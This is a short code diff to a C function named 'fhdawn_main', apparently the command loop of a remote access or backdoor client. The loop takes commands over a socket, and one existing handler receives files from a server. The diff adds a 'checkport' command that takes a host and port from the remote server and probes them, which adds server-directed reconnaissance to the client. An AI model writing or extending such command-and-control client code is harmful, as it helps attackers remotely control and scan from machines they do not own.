@@ -81,6 +81,19 @@ void fhdawn_main(void)
             CheckHost(recvbuf);
 
         }
+
+        else if(strcmp(recvbuf, "checkport") == 0)
+        {
+            memset(recvbuf, '\0', BUFFER);
+            memset(fileinfo, '\0', 2);
+            int return_code = recv(sockfd, recvbuf, BUFFER, 0);
+            if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
+            {
+                connected = FALSE;
+            }
+            split(recvbuf, fileinfo, ",");
+            checkPort(fileinfo[0], atoi(fileinfo[1]));
+        }
         // Receive file from server
         else if (strcmp(recvbuf, "frecv") == 0) // frecv (file recv) / recv file from server 
         {
